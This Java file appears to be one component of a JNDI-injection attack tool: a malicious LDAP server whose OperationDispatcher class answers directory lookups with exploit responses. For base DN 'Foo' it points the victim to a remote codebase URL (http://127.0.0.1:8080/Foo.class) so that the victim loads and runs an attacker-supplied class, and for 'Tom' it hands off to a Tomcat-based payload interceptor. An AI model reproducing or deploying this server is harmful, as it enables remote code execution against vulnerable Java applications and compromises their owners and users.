package server.ldap.dispatcher;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import server.ldap.interceptor.OperationInterceptor;
import server.ldap.interceptor.TomcatInterceptor;

import java.net.URL;

public class OperationDispatcher extends InMemoryOperationInterceptor {

    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
        String codebase = "http://127.0.0.1:8080/Foo.class";
        String base = result.getRequest().getBaseDN();
        Entry entry = new Entry(base);

        try {
            switch (base) {
                case "Foo": new OperationInterceptor(new URL(codebase)).sendResult(entry, result); break;
                case "Tom": new TomcatInterceptor().sendResult(entry, result); break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
